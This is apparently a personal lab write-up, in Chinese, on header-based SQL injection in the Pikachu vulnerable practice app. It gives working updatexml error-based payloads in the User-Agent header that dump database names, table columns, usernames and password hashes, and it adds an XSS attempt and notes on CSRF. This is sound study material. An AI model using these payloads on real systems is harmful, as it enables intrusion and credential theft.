# Pikachu (http header) 注入


### 登入

```
POST /vul/sqli/sqli_header/sqli_header_login.php HTTP/1.1
Host: pika
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://pika
Connection: close
Referer: http://pika/vul/sqli/sqli_header/sqli_header_login.php
Cookie: PHPSESSID=a66ejfuhm2prkmp2a6acicvrp5
Upgrade-Insecure-Requests: 1

username=admin&password=123456&submit=Login
```


### 中間驗證或是跳轉頁
```
GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1
Host: pika
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://pika/vul/sqli/sqli_header/sqli_header_login.php
Connection: close
Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=a66ejfuhm2prkmp2a6acicvrp5
Upgrade-Insecure-Requests: 1
```



### 最後的頁面
```
你的ip地址:127.0.0.1

你的user agent:Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0

你的http accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

你的端口（本次连接）:tcp8881
```


### 利用中間頁，來注入

```
1'

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;' at line 1
```


### 感覺後端就是 儲存了我們的http 頭

我們偷看一下答案:


```
$sql = "INSERT INTO httpinfo 
        (userid, ipaddress, useragent, httpaccept, remoteport) 

        VALUES 
        (
			 '$is_login_id', 
			 '$remoteipadd', 
			 '$useragent', 
			 '$httpaccept', 
			 '$remoteport'
        )";
```


### insert注入，最好使用報錯注入

```
$sql = "INSERT INTO httpinfo 
        (userid, ipaddress, useragent, httpaccept, remoteport) 
        
        VALUES 
        (
			 '$is_login_id', 
			 '$remoteipadd', 
			 '1' AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null) AND '1', 
			 '$httpaccept', 
			 '$remoteport'
        )";

```

### 小坑:

```
失敗
1'+AND+updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)+AND+'1 

成功
1' AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null) AND '1

//XPATH syntax error: '~5.7.26~'
```

PHP 在處理 URL 或是GET參數時會自動進行 URL 解碼（URL decode）。當使用者提交帶有 URL 參數的請求時，這些參數通常會包含特殊字符，如空格、特殊符號和編碼字符。PHP 會在接收到這些參數後自動對它們進行解碼，以便在 PHP 中進行處理。

$_SERVER['HTTP_USER_AGENT'] 是包含用戶端瀏覽器 User-Agent 字串的環境變數，並且它通常是未經解碼的原始字串。這個變數不會被 PHP 自動解碼。


### 其他payload
```

找出所有數據庫

1' AND updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,30),0x7e),1) AND '1

XPATH syntax error: '~information_schema,a_com__phpc~'   
//回顯有限制30自符可以自己調整 30-60 60-90 ....
--------------------------------------------------------------------------------

member表所有欄位

1' AND updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='member'),1,30),0x7e),1) AND '1


//XPATH syntax error: '~id,username,pw,sex,phonenum,ad~'
--------------------------------------------------------------------------------


帳號
1' AND updatexml(1,concat(0x7e,substr((select group_concat(username) from member),1,30),0x7e),1) AND '1

密碼
1' AND updatexml(1,concat(0x7e,substr((select group_concat(pw) from member),1,30),0x7e),1) AND '1

自己慢慢爆破


--------------------------------------------------------------------------------
```



## 另外一個寶貴的失敗實驗


### 我User-Agent構造出了一個XSS

```
GET /vul/sqli/sqli_header/sqli_header.php HTTP/1.1
Host: pika
User-Agent: <script>alert("123")</script>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://pika/vul/sqli/sqli_header/sqli_header_login.php
Connection: close
Cookie: ant[uname]=admin; ant[pw]=10470c3b4b1fed12c3baac014be15fac67c6e815; PHPSESSID=a66ejfuhm2prkmp2a6acicvrp5
Upgrade-Insecure-Requests: 1
Content-Length: 4
```

我原本想利用 構造一個惡意頁面，能夠幫受害者提交這些數據，並跳轉
讓受害者瀏覽器執行XSS 

一開始我用fetch，但 A site fetch  B site不同源。

当A网站发送跨域的Fetch请求到B网站时，浏览器会首先执行CORS（跨域资源共享）机制的检查。这个检查是由浏览器进行的，目的是确保在安全的情况下进行跨域请求。

B网站是否执行A网站发送的跨域请求取决于B网站的CORS配置。如果CORS配置允许，B网站会正常处理请求；如果不允许，B网站会拒绝请求



於是我想到了html 本身 form的跳轉之類的，查過後發現是可以在get 或post的情況下達到csrf-> XSS

但是這題注入點是在http header。這些設定是瀏覽器自己加的，攻擊者無法幫受害者構造。

總結CSRF 要的是跳轉相當於我們在瀏覽器輸入 www.google.com 而不是單純請求
